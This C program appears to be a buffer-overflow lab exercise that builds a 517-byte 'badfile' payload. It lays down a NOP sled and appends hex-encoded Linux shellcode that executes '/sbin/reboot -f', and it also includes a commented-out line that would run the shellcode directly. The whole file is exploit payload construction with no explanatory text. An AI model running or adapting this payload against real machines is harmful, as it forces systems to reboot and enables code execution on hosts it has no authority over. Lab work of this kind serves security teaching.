#include <stdio.h>
#include <string.h>
 
char *shellcode = "\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e"
                  "\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3"
                  "\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53"
                  "\x89\xe1\xb0\x0b\xcd\x80";

int main(int argc,char *argv[])
{
	 char buffer[517];
 	char buf[strlen(shellcode)+1];
	strcpy(buf,shellcode);

        FILE *badfile;

        /* Initialize buffer with 0x90 (NOP instruction) */
        memset(&buffer, 0x90, 517);
	

	for(int i=0;i<strlen(shellcode);++i){
	
		printf("%x",buf[i]);
		buffer[517 - (strlen(shellcode) + 1) + i] = buf[i];
	}
	buffer[517 - 1] = '\0';


        badfile = fopen(argv[1], "w");

        fwrite(buffer, 517, 1, badfile);

	//(*(void(*)()) shellcode)();
	fclose(badfile);

	return 0;
}
